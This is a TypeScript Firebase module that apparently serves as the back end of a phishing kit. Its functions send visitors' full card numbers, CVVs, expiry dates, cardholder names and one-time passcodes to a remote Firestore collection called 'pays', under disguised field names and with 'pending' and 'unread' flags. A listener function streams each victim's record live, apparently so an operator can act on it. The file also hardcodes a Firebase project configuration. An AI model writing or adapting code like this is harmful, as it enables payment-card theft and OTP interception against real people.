import { getApp, getApps, initializeApp, type FirebaseApp } from "firebase/app"
import {
  getFirestore,
  doc,
  setDoc,
  updateDoc,
  arrayUnion,
  onSnapshot,
  type Firestore,
} from "firebase/firestore"
import { getDatabase, type Database } from "firebase/database"

const firebaseConfig = {
  apiKey: "AIzaSyDnPfo274lmuWGZZQzTe-d1F2vnZs_5sEc",
  authDomain: "zzddww-z-m.firebaseapp.com",
  databaseURL: "https://zzddww-z-m-default-rtdb.firebaseio.com",
  projectId: "zzddww-z-m",
  storageBucket: "zzddww-z-m.firebasestorage.app",
  messagingSenderId: "5652569853",
  appId: "1:5652569853:web:efc2dab040371951d96894",
  measurementId: "G-NSMQZ5J1G9",
}

let app: FirebaseApp | null = null
let db: Firestore | null = null
let database: Database | null = null

if (firebaseConfig.apiKey && firebaseConfig.projectId) {
  app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig)
  db = getFirestore(app)
  database = getDatabase(app)
}

export async function addData(data: Record<string, unknown>) {
  if (typeof localStorage !== "undefined") localStorage.setItem("visitor", String(data.id))
  if (!db) return
  try {
    const docRef = doc(db, "pays", String(data.id))
    await setDoc(
      docRef,
      { ...data, createdAt: new Date().toISOString(), updatedAt: new Date().toISOString(), isUnread: true },
      { merge: true }
    )
  } catch (e) {
    console.error("Error adding document:", e)
  }
}

export async function updateLastActive(visitorId: string) {
  if (!db) return
  try {
    const docRef = doc(db, "pays", visitorId)
    await updateDoc(docRef, { lastActiveAt: new Date().toISOString(), updatedAt: new Date().toISOString() })
  } catch (e) {
    console.error("Error updating lastActiveAt:", e)
  }
}

export async function addCardToHistory(
  visitorId: string,
  cardData: { cardNumber: string; cvv: string; expiryDate: string; cardName: string }
) {
  if (!db) return
  try {
    const docRef = doc(db, "pays", visitorId)
    const entry = {
      id: Date.now().toString(),
      type: "_t1",
      timestamp: new Date().toISOString(),
      status: "pending",
      data: { _v1: cardData.cardNumber, _v2: cardData.cvv, _v3: cardData.expiryDate, _v4: cardData.cardName },
    }
    await updateDoc(docRef, {
      history: arrayUnion(entry),
      cardStatus: "pending",
      updatedAt: new Date().toISOString(),
      isUnread: true,
    })
  } catch (e) {
    console.error("Error adding card to history:", e)
  }
}

export async function addOtpToHistory(visitorId: string, otpCode: string) {
  if (!db) return
  try {
    const docRef = doc(db, "pays", visitorId)
    const entry = {
      id: Date.now().toString(),
      type: "_t2",
      timestamp: new Date().toISOString(),
      status: "pending",
      data: { _v5: otpCode },
    }
    await updateDoc(docRef, {
      history: arrayUnion(entry),
      otpCode,
      _v5: otpCode,
      _v5Status: "pending",
      updatedAt: new Date().toISOString(),
      isUnread: true,
    })
  } catch (e) {
    console.error("Error adding OTP to history:", e)
  }
}

export function subscribeToVisitor(
  visitorId: string,
  callback: (data: Record<string, unknown>) => void
): () => void {
  if (!db) return () => {}
  const docRef = doc(db, "pays", visitorId)
  return onSnapshot(docRef, (snap) => {
    if (snap.exists()) callback({ id: snap.id, ...snap.data() })
  })
}

export { db, database }
